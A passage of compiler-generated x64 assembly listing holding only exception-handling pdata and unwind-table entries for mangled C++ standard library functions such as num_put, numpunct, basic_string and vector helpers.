	DD	imagerel $unwind$?dtor$3@?0??_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z DD imagerel $LN13
	DD	imagerel $LN13+390
	DD	imagerel $unwind$?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z DD imagerel $LN23
	DD	imagerel $LN23+1700
	DD	imagerel $unwind$?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD imagerel ?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DD	imagerel ?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD imagerel ?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DD	imagerel ?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD imagerel ?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DD	imagerel ?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA DD imagerel ?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
	DD	imagerel ?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA+27
	DD	imagerel $unwind$?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z DD imagerel $LN6
	DD	imagerel $LN6+129
	DD	imagerel $unwind$?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z DD imagerel $LN6
	DD	imagerel $LN6+113
	DD	imagerel $unwind$?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z DD imagerel $LN5
	DD	imagerel $LN5+97
	DD	imagerel $unwind$??4?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@QEAAAEAV01@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$??$emplace_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@QEAA?A_TAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+118
	DD	imagerel $unwind$??$_Emplace_one_at_back@AEB_W@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEA_WAEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$??$emplace_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@QEAA?A_TAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z DD imagerel $LN4
	DD	imagerel $LN4+118
	DD	imagerel $unwind$??$_Emplace_one_at_back@AEBE@?$vector@EV?$allocator@E@std@@@std@@AEAAAEAEAEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@E@std@@V?$_Vector_val@U?$_Simple_types@E@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z DD imagerel $LN3
	DD	imagerel $LN3+47
	DD	imagerel $unwind$??$emplace_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@QEAA?A_TAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z DD imagerel $LN4
	DD	imagerel $LN4+118
	DD	imagerel $unwind$??$_Emplace_one_at_back@AEBD@?$vector@DV?$allocator@D@std@@@std@@AEAAAEADAEBD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_Vector_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z DD imagerel $LN11
	DD	imagerel $LN11+266
	DD	imagerel $unwind$??$_Traits_find@U?$char_traits@_W@std@@@std@@YA_KQEB_W_K101@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z DD imagerel $LN3
	DD	imagerel $LN3+29
	DD	imagerel $unwind$??$_Pocma@V?$allocator@_W@std@@@std@@YAXAEAV?$allocator@_W@0@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??$?0V?$allocator@_W@std@@$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@_W@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN7
	DD	imagerel $LN7+449
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN7
	DD	imagerel $LN7+384
	DD	imagerel $unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z DD imagerel $LN11
	DD	imagerel $LN11+261
	DD	imagerel $unwind$??$_Traits_find@U?$char_traits@D@std@@@std@@YA_KQEBD_K101@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??$?0V?$allocator@D@std@@$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@$$QEAV?$allocator@D@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z DD imagerel $LN3
	DD	imagerel $LN3+46
	DD	imagerel $unwind$??$?0$$V@?$_Compressed_pair@V?$allocator@D@std@@V?$_String_val@U?$_Simple_types@D@std@@@2@$00@std@@QEAA@U_Zero_then_variadic_args_t@1@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z DD imagerel $LN7
	DD	imagerel $LN7+417
	DD	imagerel $unwind$??$_Construct@$0A@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z DD imagerel $LN7
	DD	imagerel $LN7+416
	DD	imagerel $unwind$??$_Construct@$00PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z DD imagerel $LN7
	DD	imagerel $LN7+384
	DD	imagerel $unwind$??$_Construct@$01PEBD@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAXQEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Float_put_desired_precision@O@std@@YAH_JH@Z DD imagerel $LN14
	DD	imagerel $LN14+151
	DD	imagerel $unwind$??$_Float_put_desired_precision@O@std@@YAH_JH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Float_put_desired_precision@N@std@@YAH_JH@Z DD imagerel $LN14
	DD	imagerel $LN14+151
	DD	imagerel $unwind$??$_Float_put_desired_precision@N@std@@YAH_JH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z DD imagerel $LN11
	DD	imagerel $LN11+257
	DD	imagerel $unwind$??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA DD imagerel ?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
	DD	imagerel ?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA+24
	DD	imagerel $unwind$?dtor$1@?0???$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decimal_point@?$numpunct@D@std@@QEBADXZ DD imagerel $LN3
	DD	imagerel $LN3+30
	DD	imagerel $unwind$?decimal_point@?$numpunct@D@std@@QEBADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?thousands_sep@?$numpunct@D@std@@QEBADXZ DD imagerel $LN3
	DD	imagerel $LN3+30
	DD	imagerel $unwind$?thousands_sep@?$numpunct@D@std@@QEBADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+64
	DD	imagerel $unwind$?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+64
	DD	imagerel $unwind$?falsename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+64
	DD	imagerel $unwind$?truename@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z DD imagerel $LN4
	DD	imagerel $LN4+87
	DD	imagerel $unwind$??0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA DD imagerel ?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA
	DD	imagerel ?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0???0?$numpunct@D@std@@QEAA@AEBV_Locinfo@1@_K_N@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z DD imagerel $LN10
	DD	imagerel $LN10+235
	DD	imagerel $unwind$?_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+29
	DD	imagerel $unwind$?dtor$0@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA DD imagerel ?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
	DD	imagerel ?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA+38
	DD	imagerel $unwind$?dtor$1@?0??_Getcat@?$numpunct@D@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1?$numpunct@D@std@@MEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+49
	DD	imagerel $unwind$??1?$numpunct@D@std@@MEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z DD imagerel $LN8
	DD	imagerel $LN8+465
	DD	imagerel $unwind$?_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA DD imagerel ?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA
	DD	imagerel ?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA+24
	DD	imagerel $unwind$?dtor$0@?0??_Init@?$numpunct@D@std@@IEAAXAEBV_Locinfo@2@_N@Z@4HA
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+62
	DD	imagerel $unwind$?do_grouping@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+62
	DD	imagerel $unwind$?do_falsename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ DD imagerel $LN5
	DD	imagerel $LN5+62
	DD	imagerel $unwind$?do_truename@?$numpunct@D@std@@MEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Tidy@?$numpunct@D@std@@AEAAXXZ DD imagerel $LN3
	DD	imagerel $LN3+56
	DD	imagerel $unwind$?_Tidy@?$numpunct@D@std@@AEAAXXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_G?$numpunct@D@std@@MEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+59
	DD	imagerel $unwind$??_G?$numpunct@D@std@@MEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z DD imagerel $LN3
	DD	imagerel $LN3+111
	DD	imagerel $unwind$??R<lambda_319d5e083f45f90dcdce5dce53cbb275>@@QEBA@QEADQEBD_KD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z DD imagerel $LN6
	DD	imagerel $LN6+432
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_319d5e083f45f90dcdce5dce53cbb275>@@D@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z DD imagerel $LN3
	DD	imagerel $LN3+128
	DD	imagerel $unwind$??R<lambda_65e615be2a453ca0576c979606f46740>@@QEBA@QEADQEBD_K12@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z DD imagerel $LN6
	DD	imagerel $LN6+460
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_65e615be2a453ca0576c979606f46740>@@PEBD_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z DD imagerel $LN3
	DD	imagerel $LN3+76
	DD	imagerel $unwind$??$_Construct_in_place@PEADAEAPEAD@std@@YAXAEAPEAD0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ DD imagerel $LN3
	DD	imagerel $LN3+30
	DD	imagerel $unwind$?pubsync@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z DD imagerel $LN5
	DD	imagerel $LN5+122
	DD	imagerel $unwind$?sputc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAAHD@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z DD imagerel $LN3
	DD	imagerel $LN3+50
	DD	imagerel $unwind$?sputn@?$basic_streambuf@DU?$char_traits@D@std@@@std@@QEAA_JPEBD_J@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ DD imagerel $LN3
	DD	imagerel $LN3+85
	DD	imagerel $unwind$?_Pninc@?$basic_streambuf@DU?$char_traits@D@std@@@std@@IEAAPEADXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
